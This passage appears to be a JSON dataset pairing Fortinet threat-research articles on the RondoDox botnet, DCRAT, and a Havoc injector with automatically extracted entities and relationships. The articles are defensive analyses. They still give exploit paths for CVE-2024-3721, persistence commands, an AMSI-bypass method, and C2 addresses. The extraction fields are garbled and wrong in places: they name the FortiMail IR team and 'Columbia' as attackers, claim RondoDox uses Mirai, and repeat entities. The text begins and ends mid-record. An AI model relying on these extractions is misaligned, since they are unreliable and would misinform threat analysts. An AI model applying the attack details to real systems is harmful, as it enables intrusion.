f8403e30dd495561dc0674a3b1aedaea5d6839808428069d98e30e19bd6dc045fbffe681c61f9bba4c7abcb6e8fe09ef4d28166a10bfeb73281f874d84f69b3d39c68962a6b0963b56085a0f1a2af25c7974a167b650cf99eb1acd433ecb772b9d1f587b1bd2cce1a14a1423a77eb746d126e1982a0a794f6b870a2d7178bd2c7b2b757e09fa36f817568787f9eae8ca732dd372853bf13ea50649dbb62f0c5b f4f6beea11f21a053d27d719dab711a482ba0e2e42d160cefdbdad7a958b93d0 Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (Microsoft Windows, Vulnerability), (Microsoft Windows, Threat Type), (kpuszkiev.com, Domain), (hxxps://cutt[.]ly/4rnmskDe, URL), (hxxps://secfileshare[.]com, URL), (Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar, File), (1.hta, File), (PowerShell.exe, Tool), (C:\\Users\\Public\\Documents\\install.exe, File), (NordDragonScan, Malware), (2025 Global Threat Landscape Report, File), (hxxps://secfileshare[.]com, Domain), (APT, Threat Type), (hxxps://cutt[.]ly/4rnmskDe, URL), (hxxps://secfileshare[.]com, Domain), (kpuszkiev.com, Domain), (2025 Global Threat Landscape Report, File), (APT, Threat Type), (hxxps://cutt[.]ly/4rnmskDe, URL), (hxxps://secfileshare[.]com, Domain), (kpuszkiev.com, Domain), (2025 Global Threat Landscape Report, File), (APT, Threat Type",
      "entities": [
        [
          "Microsoft Windows",
          "Vulnerability"
        ],
        [
          "Microsoft Windows",
          "Threat Type"
        ],
        [
          "kpuszkiev.com",
          "Domain"
        ],
        [
          "hxxps://cutt[.]ly/4rnmskDe",
          "URL"
        ],
        [
          "hxxps://secfileshare[.]com",
          "URL"
        ],
        [
          "Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar",
          "File"
        ],
        [
          "1.hta",
          "File"
        ],
        [
          "PowerShell.exe",
          "Tool"
        ],
        [
          "C:\\Users\\Public\\Documents\\install.exe",
          "File"
        ],
        [
          "NordDragonScan",
          "Malware"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ],
        [
          "hxxps://secfileshare[.]com",
          "Domain"
        ],
        [
          "APT",
          "Threat Type"
        ],
        [
          "hxxps://cutt[.]ly/4rnmskDe",
          "URL"
        ],
        [
          "hxxps://secfileshare[.]com",
          "Domain"
        ],
        [
          "kpuszkiev.com",
          "Domain"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ],
        [
          "APT",
          "Threat Type"
        ],
        [
          "hxxps://cutt[.]ly/4rnmskDe",
          "URL"
        ],
        [
          "hxxps://secfileshare[.]com",
          "Domain"
        ],
        [
          "kpuszkiev.com",
          "Domain"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 22,
    "relationship_count": 0,
    "model": "Qwen3 4B",
    "index": 6
  },
  {
    "title": "RondoDox Unveiled: Breaking Down a New Botnet Threat",
    "link": "https://www.fortinet.com/blog/threat-research/rondobox-unveiled-breaking-down-a-botnet-threat",
    "content": "FortiGuard Labs Threat Research A new botnet built for evasion and disruption Affected Platforms:TBK DVR-4104. TBK DVR-4216. Four-Faith router models F3x24. Four-Faith router models F3x36.Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Over the past month, FortiGuard Labs has observed a significant increase in scanning activity, including a new botnet campaign that exploits two high-risk vulnerabilities:CVE-2024-3721andCVE-2024-12856. Both have been publicly disclosed and are actively being targeted, posing serious risks to device security and overall network integrity. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The botnet responsible for these attacks has been namedRondoDox. Unlike widespread variants such as Mirai or Gafgyt, RondoDox is a relatively new and low-profile threat. FortiGuard Labs first identified a similar ELF binary in September 2024. Notably, RondoDox incorporates custom libraries and mimics traffic from gaming platforms or VPN servers to evade detection. CVE-2024-3721is a critical vulnerability affecting TBK DVR models, including DVR-4104 and DVR-4216, as of April 12, 2024. The flaw stems from improper handling of the /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___ path, where the mdb and mdc parameters can be manipulated to inject OS commands. Successful exploitation allows remote attackers to execute arbitrary commands on affected devices. CVE-2024-12856impacts Four-Faith router models F3x24 and F3x36. The vulnerability allows authenticated remote attackers to execute arbitrary operating system commands via HTTP by exploiting the apply.cgi interface when modifying the system time. RondoDox was initially distributed to target Linux-based operating systems running on ARM and MIPS architectures. However, recent findings show the emergence of a shell script downloader that suggests the malware is now capable of targeting a broader range of Linux architectures, including Intel 80386, MC68000, MIPS R3000, PowerPC, SuperH, ARCompact, x86-64, and AArch64. The shell script begins by instructing the victim host to ignore several signals, including SIGTTOU, SIGTTIN, SIGTSTP, SIGHUP, SIGPIPE, SIGINT, SIGQUIT, and SIGTERM. It then checks for writable paths such as /dev, /dev/shm, the victim user’s home directory, /mnt, /run/user/0, /var/log, /var/run, /var/tmp, and /data/local/tmp, verifying if any are mounted without the noexec flag as listed in /proc/mounts. Finally, it creates a lib directory inside /tmp, downloads and executes the “RondoDox” malware, and clears the command execution history to evade detection. The following analysis focuses on the x86-64 architecture binary named rondo.x86_64. The RondoDox malware encodes its configuration data using a simple XOR obfuscation algorithm. This includes elements such as file paths and tool filenames. All encoded values can be decrypted using the hexadecimal key 0x21. After decoding its configuration data, RondoDox implements a persistence mechanism to maintain its presence on the victim host. RondoDox modifies file permissions and symbolic links to establish persistence. As shown in Figure 6, the XOR-encoded values byte_51D670 and byte_51D6C0 decode to /etc/init.d/rondo and /etc/rc3.d/S99rondo, respectively. Additionally, the malware embeds a shell script designed to execute its persistence routines on the victim system. In addition to using init scripts, RondoDox appends its launch command to several system startup files, including /etc/rcS, /etc/init.d/rcS, and /etc/inittab, as well as to both user and root crontab entries. This layered persistence strategy ensures that even if one method is removed or disabled, others remain active to automatically reinstate the botnet upon system reboot. Upon execution, RondoDox retrieves its own process ID and scans the system for specific applications. It looks for keywords associated with network utilities (such as wget and curl), system analysis tools (like Wireshark and gdb), or other malware (e.g., cryptominers or Redtail variants). If any such processes are detected, RondoDox immediately terminates them to evade analysis and maintain operational stealth. dhpcd apcid redtail xmrig miner ps top htop pstree lsof netstat ss wireshark tshark ngrep dumpcap tcpdump passwd chpasswd iptables nc netcat ufw gdb gdbserver cgdb strace valgrind stap dtrace sysdig bpftrace scp shutdown poweroff halt reboot During analysis of RondoDox, we noticed that the malware writes the email address vanillabotnet@protonmail[.]com to the file tmp/contact.txt. However, no further use of this address has been observed within the malware’s execution flow or command logic. Next, RondoDox scans several common Linux executable directories, including: It then renames selected executable files to hardcoded strings of random characters. This action is intended to disrupt critical system functions, including firewall configuration, user account management, and shutdown operations. By corrupting these binaries, the malware impairs system stability and complicates recovery efforts. Original File Name Modified File Name Iptables jsuJpf ufw nqqbsc passwd ahwdze chpasswd ereghx shutdown hhrqwk poweroff dcwkkb halt cjtzgw reboot gaajct After completing its setup routines, RondoDox decodes its command-and-control (C2) server address—83[.]150[.]218[.]93—using the key \"rondo\", and then initiates a connection to the server. The malware receives commands from its C2 server for subsequent DDoS attacks. RondoDox is capable of launching distributed denial-of-service (DDoS) attacks using three primary protocols: HTTP, UDP, and TCP. To evade detection, it disguises malicious traffic by emulating popular games and platforms such as Valve, Minecraft, Dark and Darker, Roblox, DayZ, Fortnite, GTA, as well as tools like Discord, OpenVPN, WireGuard, and RakNet. For example, when RondoDox receives a command from its C2 server to attack a specific target while impersonating OpenVPN traffic, it crafts packet payloads that include the OpenVPN \"magic byte,\" which begins with \\x38, as shown in Figure 17. Beyond gaming and chat protocols, RondoDox can also mimic custom traffic from tunneling and real-time communication services, including WireGuard, OpenVPN variants (e.g., openvpnauth, openvpncrypt, openvpntcp), STUN, DTLS, and RTC. By impersonating these legitimate services, the malware significantly increases the difficulty for defenders in effectively identifying and blocking its traffic. RondoDox is a sophisticated and emerging malware threat that employs advanced evasion techniques, including anti-analysis measures, XOR-encoded configuration data, custom-built libraries, and a robust persistence mechanism. These capabilities allow it to remain undetected and maintain long-term access on compromised systems. The malware primarily exploits two known vulnerabilities—CVE-2024-3721andCVE-2024-12856—highlighting the critical need for timely patching of affected systems. Its use of obfuscation, service mimicry, and multi-layered persistence underscores its growing threat potential. Ongoing monitoring, threat intelligence sharing, and in-depth behavioral analysis are crucial for comprehending the full extent of RondoDox and for developing effective detection and mitigation strategies. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/RondoDox.A!tr.dldrELF/RondoDox.CTO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerabilities: CVE-2024-3721: TBK.DVR.SOSTREAMAX.Command.InjectionCVE-2024-12856: Four-Faith.Routers.adj_time_year.Command.Injection We also suggest that organizations consider completingFortinet’s free trainingmodule,Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 45[.]135[.]194[.]3483[.]150[.]218[.]9314[.]103[.]145[.]20214[.]103[.]145[.]211154[.]91[.]254[.]9578[.]153[.]149[.]90 Downloader c88f60dbae08519f2f81bb8efa7e6016c6770e66e58d77ab6384069a515e451ceb3e2a6a50f029fc646e2c3483157ab112f4f017406c3aabedaae0c94e0969f6f4cd7ab04b1744babef19d147124bfc0e9e90d557408cc2d652d7192df61bda9 RondoDox e3c080e322862d065649c468d20f620c3670d841c30c3fe5385e37f4f10172e7e62df17150fcb7fea32ff459ef47cdd452a21269efe9252bde70377fd2717c1053e2c2d83813d1284ddb8c68b1572b17cca95cfc36a55a7517bf45ff40828be543d4847bf237c445ed2e846a106e1f55abefef5c3a8545bd5e4cad20f5deb9a44c2429fc8b8ec61da41cbba1b8184ec45fa93a9841b4ca48094bba7741b826b8694d729d67f1b0c06702490bfab1df3a96fe040fe5d07efa5c92356c329757beedae3b75deb8013bd48ac4534cca345b90938a2abb91672467c2bf9ae81ff6830814a0781ab30fca069a085dba201d6fd0f414498fafa4bb42859786d91d478159b4deee977e9e27b60e7e179d54a1ce8e56624e73b799523416eee828bfaf769f916a552efc6775367a31357a633dc0be01879830d3fddccdf3c40b26e50afd0a9ebbecc8ec58c253039520304ca373cfb8d1674d67993e6485e244a77d6ec96c81fd73b4bef6fef379cbefdcce7f374ea7e6bf1bf0917cf4ca7b72d4cee788a55a3859a203ca2bae7399295f92aeae61d845ffa173c1938f938f5c148eef9957573779f9a62eecb80737d41d42165af8bb9884579c50736766abb63d2835ba3daa53204978b7797bd53f5c964eed7a73d971517a764785ce3ab65a9423c2e78bf8928bc255e73e0b5b0ce13747c64d82d5f2647da129f189138773733ac21f20a24b179bdbbdcc0053838c0484ea25eff6976f2b8cb5630ab4efb28b0f06b542aa715573c7d2fca01914504cb7336db715d73d1e20d23e4bd37f2e4f4fe389c9278ce988343606350a94156ca28ee28bd605d1d95c810a16866eee1f997598a197f60d5f5641f2c56576b4c867d141612c6e00db29c512f266835510b8a62d8250d289c5ec87752cec1af31eed0347cf2dd54dc0fbeea645319c4dae238ee2d02414a54e97ad26748812002610f1491a2a746e9ba0f9d05de3d47d7bab4f5ec123a91fdacd9a4c0bcf800d6b7db5162cfd11cb71e260647ef0f2c60978ebfcef708fec1afbea4fb32b586e0dacf0d228c375a532008d81453c367256afea5a305507f34c14c72cab35715b7f7b25b32352a8e19b8a283003aaf539d12ca517937e6ab0dfcedfa23eced7b52d3899b0847df3fcb7a9c326b71027a7ab5f5b93 botnets,botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (botnet, Threat Type), (TBK DVR-4104, File), (TBK DVR-4216, File), (Four-Faith router models F3x24, File), (Four-Faith router models F3x36, File), (RondoDox, Malware), (CVE-2024-3721, Vulnerability), (CVE-2024-12856, Vulnerability), (2025 Global Threat Landscape Report, File), (Mirai, Malware), (Gafgyt, Malware), (ELF binary, File), (FortiGuard Labs, Organization), (RondoDox, Malware), (CVE-2024-3721, Vulnerability), (CVE-2024-12856, Vulnerability)\nRelationships: (botnet, aka, RondoDox), (RondoDox, exploit, CVE-2024-3721), (RondoDox, exploit, CVE-2024-12856), (RondoDox, use, Mirai), (RondoDox, use, Gafgyt), (RondoDox, use, ELF binary), (RondoDox, target, TBK",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "botnet",
          "Threat Type"
        ],
        [
          "TBK DVR-4104",
          "File"
        ],
        [
          "TBK DVR-4216",
          "File"
        ],
        [
          "Four-Faith router models F3x24",
          "File"
        ],
        [
          "Four-Faith router models F3x36",
          "File"
        ],
        [
          "RondoDox",
          "Malware"
        ],
        [
          "CVE-2024-3721",
          "Vulnerability"
        ],
        [
          "CVE-2024-12856",
          "Vulnerability"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ],
        [
          "Mirai",
          "Malware"
        ],
        [
          "Gafgyt",
          "Malware"
        ],
        [
          "ELF binary",
          "File"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "RondoDox",
          "Malware"
        ],
        [
          "CVE-2024-3721",
          "Vulnerability"
        ],
        [
          "CVE-2024-12856",
          "Vulnerability"
        ]
      ],
      "relationships": [
        [
          "botnet",
          "aka",
          "RondoDox"
        ],
        [
          "RondoDox",
          "exploit",
          "CVE-2024-3721"
        ],
        [
          "RondoDox",
          "exploit",
          "CVE-2024-12856"
        ],
        [
          "RondoDox",
          "use",
          "Mirai"
        ],
        [
          "RondoDox",
          "use",
          "Gafgyt"
        ],
        [
          "RondoDox",
          "use",
          "ELF binary"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 17,
    "relationship_count": 6,
    "model": "Qwen3 4B",
    "index": 7
  },
  {
    "title": "DCRAT Impersonating the Colombian Government",
    "link": "https://www.fortinet.com/blog/threat-research/dcrat-impersonating-the-columbian-government",
    "content": "FortiGuard Labs Threat Research Multi-layered obfuscation used to deploy remote access trojan Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Control and collect victim’s sensitive information from the victim’s devicePrevalence:Columbia targetedSeverity Level:High The FortiMail IR team recently uncovered a new email attack distributing a Remote Access Trojan called DCRAT. The threat actor is impersonating a Colombian government entity to target organizations in Colombia. The threat actor uses multiple techniques, such as a password protected archive, obfuscation, steganography, base64 encoding, and multiple file drops, to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. 1. Modular ArchitectureDCRAT is designed with a modular structure, allowing attackers to add or remove plugins. This lets them tailor the RAT’s behavior to specific tasks like data theft, surveillance, or persistence. 2. Comprehensive Surveillance CapabilitiesThe RAT allows remote control over infected systems. Attackers can execute commands, manage files, monitor user activity, and even download or run additional malicious payloads. 3. Information TheftIt can steal sensitive information such as credentials, documents, browser data, and personal files. It also supports screenshot capture and keylogging to record user input. 4. System ManipulationDCRAT can alter system settings — rebooting, shutting down, logging off users, or creating new accounts. It can also change visual elements like wallpapers and taskbar visibility. 5. File and Process ManagementThe malware supports creating, deleting, renaming, or moving files and folders. It can run or terminate processes and upload/download files to or from the victim’s system. 6. Browser and Credential HarvestingIt specifically targets browsers to extract stored data such as cookies, browsing history, and saved login credentials. It can also open websites and perform actions in the user’s browser. The threat actor sends an email impersonating a Colombian government entity to trick the user to run the attachment contents while having the recipient in the BCC field: The ZIP attachment contains a bat file which will drop an obfuscated vbs file from a pastebin like website to C:\\Windows\\Temp: The vbs file is heavily obfuscated and is made to trick analysts and systems: After removing the junk and the obfuscation, we found the following, which eventually runs the base64 variable: The base64 code in the first variable contained another script: Cleaning the above script reveals the following: This script sets a reversed URL as a variable and points it to an image which contains data hidden with base64. Unfortunately, the URL can’t be reversed and the image payload is no longer available. But due to the presence of the URL, which contains an exe file in base64 and the contents of the code itself, it is safe to assume it would extract the image data and invoke a .NET library to download thethird and final payload from the reversed URL to C:\\Users\\Public\\Downloads: The base64 string in the reversed URL contains the RAT exe file. Looking at the main function, we see multiple calls: It starts with a small delay, and then goes into InitializeSettings, which will decrypt settings encrypted with AES256. The AES256 key is hardcoded and is in base 64: Variables revealed after the decryption: Ports– 8848Hosts- 176.]65.]144.]19Version– 1.0.7Install– falseMTX– DcRatMutex_qwqdanchunPastebin– nullAnti– falseAnti_Process– falseBS_OD– falseGroup– AUHWID– This takes the properties of the machine, concatenates them, converts that into an MD5 hash, and then converts that hash into a hexadecimal string. It then takes the first 20 characters and converts them into upper case. Server signature – iHIVV6dj49xn32TizMB3V5F6bAZIlmMWQuHKEN0CBcWc9Ig0HTq78LVe/AKhThRcQR7wOt/8i61T7NkoN+CPhQ8311QUiU2j4NTTO3B/f3ifVSB2vTGJgrF19iqrqUwK8NKkJnHR+29/ec7pz4lMhwJSOhYYj0ZB9BtUYMUzsic= Server certificate - MIICMDCCAZmgAwIBAgIVAJdJTOcvv+RE0UKkRJdxy6sUSIJ9MA0GCSqGSIb3DQEBDQUAMGQxFTATBgNVBAMMDERjUmF0IFNlcnZlcjETMBEGA1UECwwKcXdxZGFuY2h1bjEcMBoGA1UECgwTRGNSYXQgQnkgcXdxZGFuY2h1bjELMAkGA1UEBwwCU0gxCzAJBgNVBAYTAkNOMB4XDTI0MDYyNjE0MzcyN1oXDTM1MDQwNTE0MzcyN1owEDEOMAwGA1UEAwwFRGNSYXQwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKBWZ41Q3CUr6D9fGM31TTe3ObXCDtWIxyuls5ZxROJrzVNlVm5Mb2zSE/543JczTUE94b3YzFPMUMJJ3SB7vpO7L4lMe0W+JlZClj/00M3J6b7a4bB4/c/BVrO3O5RMGNlMSCy68zX8roxt0SFUdlB2L6JJ2xEuaVv/9bdejAK7AgMBAAGjMjAwMB0GA1UdDgQWBBSKoz4PgqFtf1/VImq3jWW0Pxsu5zAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBDQUAA4GBAIrcEfDtCf8noEqBq9iAkPXXTNhGZ3YgwxGfvgWCAGSrWcEdOs2tWJ4Vx1EgAy6SZ6tJq6soFYOJohwV4S22WVnoQzzPgB759pR36AP0zFjxEhhci0wTHQuP8wRW8oTOCsQxjjHrFFBCqHLTq4Wc59cWbLwuTSBSTgqM0u1iOvO9 After initializing those settings, it runs VerifyHash, which checks if the signature is valid for that hash and public key. Following the main function, if Anti had been TRUE, it would run the following anti analysis function: This runs a query that selects everything from Win32_CacheMemory and iterates through each one. Win32_CacheMemory provides info about cache memory devices. If there are none, it could indicate the presence of a VM. Following the next call, it creates a mutex with the mutex name previously decrypted and saved into MTX. (DcRatMutex_qwqdanchun) If the Anti Process were true, it would run a code that would constantly check for the processes mentioned in it and terminate them if detected: After the next call, if BS_OD (i.e., Blue Screen of Death) was set to true and the user had administrative privileges, the code would attempt to mark the malware process as a critical system process using RtlSetProcessIsCritical. Terminating such a process would trigger a blue screen of death. Following the next call, if In_stall were true, it would run through a few blocks of code under Install(). This code block uses FileInfo to retrieve properties of the Install_Folder variable, which in this case points to the AppData\\Roaming directory. It then obtains the full file path of the currently running malware and compares it to the Install_Folder path. If the paths do not match, it iterates through all running processes and terminates any that are executing from the Install_Folder location. If the user has administrative privileges, the malware spawns a hidden cmd process to execute a base64-decoded command string: /c schtasks /create /f /sc onlogon /rl highest /tn It then appends parameters to register the malware binary as a scheduled task for persistence. The final command executed is: /c schtasks /create /f /sc onlogon /rl highest /tn \"TASK NAME\" /tr \"\\\"FULL PATH OF THE EXECUTABLE\\\"\" & exit If the user lacks administrative privileges, the malware instead creates a registry entry under: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ The entry uses the malware’s filename and path to ensure it is executed at user logon. After completing the previous steps, the malware checks whether the file still exists at the path specified by FullName (i.e., the full path of the currently running executable) and pauses execution for one second. It then creates a new file in the AppData\\Roaming directory and copies the current executable into that location. Next, it generates a .bat file in the AppData\\Local\\Temp directory containing a script designed to execute the dropped file and then delete itself. The contents of the batch file are as follows: @echo offtimeout 3 > NULSTART \"\" \"DROPPED FILE LOCATION\"CD xxx\\AppData\\Local\\Temp\\DEL \"BAT FILE NAME\" /he flags: This function instructs Windows to keep the display on and prevent the system from entering sleep mode, maintaining this state continuously until explicitly reset. It uses the value 2147483651U, which corresponds to 0x80000003 in hexadecimal. According to Microsoft’s documentation for SetThreadExecutionState (a function imported from kernel32.dll), this value is a combination of the following flags: Combined, these flags ensure that the system remains active and the screen remains on without interruption. The RAT then checks to see if the user is an admin. If so, it runs the CleanSetting function: This function performs the following: The RAT then calls for the Amsi.Bypass function The function receives two base64-encoded strings and determines whether the current process is running in 32-bit or 64-bit mode. It then passes this architecture-specific value as a byte to the PatchA function. Inside PatchA, the function decodes two base64 strings: \"amsi.dll\" and \"AmsiScanBuffer\". AmsiScanBuffer is a function provided by the Windows Antimalware Scan Interface (AMSI), available in Windows 10 and later. AMSI allows applications to pass memory buffers to the system’s antivirus engine for scanning. The function proceeds to load amsi.dll into memory and retrieves the address of the AmsiScanBuffer function. It then attempts to inject a patch into this memory location, with the goal of sabotaging or disabling AMSI’s ability to detect malicious code. Finally, the RAT enters an infinite loop, continuously attempting to connect to its command-and-control (C2) server. In this case, the C2 address was hardcoded, as noted earlier. However, the RAT also supports retrieving the C2 address dynamically from a remote URL stored in the Paste_bin variable. The attacker sends a phishing email impersonating a Colombian government agency to deceive the user into executing a malicious file. To evade detection, the attack chain employs multiple obfuscation techniques, including steganography and multi-stage payloads. When the file is run, it downloads an obfuscated VBS script from a text-sharing site. This script, in turn, executes obfuscated PowerShell code that retrieves a second link from another sharing site. It then extracts and invokes a .NET library embedded within an image file using steganography to deliver and execute the final payload. The impact of such an attack is severe: giving a threat actor direct access to a victim’s machine can result in the theft of sensitive data, system compromise, and significant operational or financial damage. FortiMail dynamically detects the email, the BAT file, and the VBS file as malware. FortMail also detects the files statically based on the system’s advanced threat engines and previous threat intelligence research. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Agent.CFQ!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. URLs: hxxp[:]//paste[.]ee/d/jYHEqBJ3/0hxxps[:]//paste[.]ee/d/oAqRiS3ghxxps[:]//ia601205[.]us[.]archive[.]org/26/items/new_image_20250430/new_image[.]jpg ZIP:db21cc64fb7a7ed9075c96600b7e7e7007a0df7cb837189c6551010a6f828590BAT:34b8040d3dad4bd9f34738fbc3363fcda819ac479db8497fb857865cee77ad89VBS:b0f3c7ea17875b5e1545678b3878ce268ff4bde718b66254ce01b0bb864801b8EXE:77a22e30e4cc900379fd4b04c707d2dfd174858c8e1ee3f1cbecd4ece1fab3feC2:176[.]65[.]144[.]19[:]8848 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (DCRAT, Malware), (FortiMail IR team, Attacker), (Columbia, Attacker), (Microsoft Windows, Platform), (Remote Access Trojan, Threat Type), (password protected archive, Technique), (obfuscation, Technique), (steganography, Technique), (base64 encoding, Technique), (multiple file drops, Technique), (2025 Global Threat Landscape Report, File), (Modular Architecture, Technique), (Comprehensive Surveillance Capabilities, Technique), (Information Theft, Technique), (Syste, Technique)\nRelationships: (FortiMail IR team, targets, Columbia), (FortiMail IR team, uses, password protected archive), (FortiMail IR team, uses, obfuscation), (FortiMail IR team, uses, steganography), (FortiMail IR team, uses, base64 encoding), (FortiMail IR team, uses, multiple file drops), (FortiMail IR team, uses, Modular Architecture), (FortiMail IR team, uses, Comprehensive Surveillance Capabilities), (FortiMail IR team, uses, Information Theft), (FortiMail IR team, uses, Syste), (DCRAT, is a type of, Remote Access Trojan), (FortiMail IR team, associated with, DCRAT), (FortiMail IR team, targets, Microsoft Windows), (FortiMail IR team, associated with",
      "entities": [
        [
          "DCRAT",
          "Malware"
        ],
        [
          "FortiMail IR team",
          "Attacker"
        ],
        [
          "Columbia",
          "Attacker"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Remote Access Trojan",
          "Threat Type"
        ],
        [
          "password protected archive",
          "Technique"
        ],
        [
          "obfuscation",
          "Technique"
        ],
        [
          "steganography",
          "Technique"
        ],
        [
          "base64 encoding",
          "Technique"
        ],
        [
          "multiple file drops",
          "Technique"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ],
        [
          "Modular Architecture",
          "Technique"
        ],
        [
          "Comprehensive Surveillance Capabilities",
          "Technique"
        ],
        [
          "Information Theft",
          "Technique"
        ],
        [
          "Syste",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "FortiMail IR team",
          "targets",
          "Columbia"
        ],
        [
          "FortiMail IR team",
          "uses",
          "password protected archive"
        ],
        [
          "FortiMail IR team",
          "uses",
          "obfuscation"
        ],
        [
          "FortiMail IR team",
          "uses",
          "steganography"
        ],
        [
          "FortiMail IR team",
          "uses",
          "base64 encoding"
        ],
        [
          "FortiMail IR team",
          "uses",
          "multiple file drops"
        ],
        [
          "FortiMail IR team",
          "uses",
          "Modular Architecture"
        ],
        [
          "FortiMail IR team",
          "uses",
          "Comprehensive Surveillance Capabilities"
        ],
        [
          "FortiMail IR team",
          "uses",
          "Information Theft"
        ],
        [
          "FortiMail IR team",
          "uses",
          "Syste"
        ],
        [
          "DCRAT",
          "is a type of",
          "Remote Access Trojan"
        ],
        [
          "FortiMail IR team",
          "associated with",
          "DCRAT"
        ],
        [
          "FortiMail IR team",
          "targets",
          "Microsoft Windows"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 13,
    "model": "Qwen3 4B",
    "index": 8
  },
  {
    "title": "Dissecting a Malicious Havoc Sample",
    "link": "https://www.fortinet.com/blog/threat-research/dissecting-a-malicious-havoc-sample",
    "content": "FortiGuard Labs Threat Research A Follow-Up to “Intrusion into Middle East Critical National Infrastructure Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the compromised computerSeverity level:High This analysis is a follow-up to the investigation titled ‘Intrusion into Middle East Critical National Infrastructure’(full reporthere), led by the FortiGuard Incident Response Team (FGIR), which investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East. That report revealed that the attacker added several pieces of malware to the system’s Task Scheduler to maintain persistence. In this report, we conduct a detailed analysis of one of the malicious Havoc variant samples. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Havoc is a well-known post-exploitation command and control (C2) backdoor framework, primarily written in C++ and Go. We describe how this Havoc variant is decrypted from a DLL file and then deployed in a newly created “cmd.exe” process, how the Havoc demon communicates with its C2 server, and what malicious actions it can perform on the compromised Windows system. The remote injector (conhost.exe) is launched by the system Task Scheduler using the following command line. C:\\Windows\\System32\\drivers\\conhost.exe -f conhost.dll -ER --ln --path cmd.exe Since the release of Windows 7, Windows OS has included conhost.exe (Console Window Host) to handle the command-line interface. The attacker disguised the remote injector as conhost.exe to mislead the victim. According to our analysis, the remote injector supports multiple features controlled by command-line parameters. The “conhost.dll” passed with the “-f” parameter contains the encrypted Havoc payload, and the “cmd.exe” specified by the “--path” parameter is the target process, into which Havoc will be injected and executed. When the fake conhost.exe is executed without any parameters, it displays its help information (Figure 1), which explains how to use the remote injector and its available options. Once the remote injector starts, it creates a “cmd.exe” process, specified by the “-- path” argument, by calling the API CreateProcessA(), as shown in Figure 2. The remote injector then decrypts a Havoc payload, referred to as the Havoc agent or demon within the Havoc framework, using a piece of shellcode embedded in the conhost.dll file. Figure 3 shows the decryption function in the remote injector, a portion of the decrypted shellcode, and the decrypted Havoc payload in the memory at the bottom of the debugger. The decryption key and IV are generated from the first 30H bytes of the conhost.dll file. Next, the remote injector calls two APIs, ZwAllocateVirtualMemory() and ZwWriteVirtualMemory(), using the ProcessHandle of the newly created “cmd.exe” process to inject the decrypted shellcode and Havoc executable into the process. Finally, the remote injector creates a remote thread by calling the ZwCreateThreadEx() API. The ProcessHandle parameter is again set to the newly created “cmd.exe” process, and its lpStartAddress parameter points to the address of the injected shellcode within the process. The purpose of shellcode is to deploy the subsequent Havoc payload (a DLL file) into the “cmd.exe” process and execute it. Havoc Framework is a typical RAT (Remote Access Trojan) and an open-source project available on GitHub. The Framework is written in multiple languages, including Golang, C, C++, Qt, 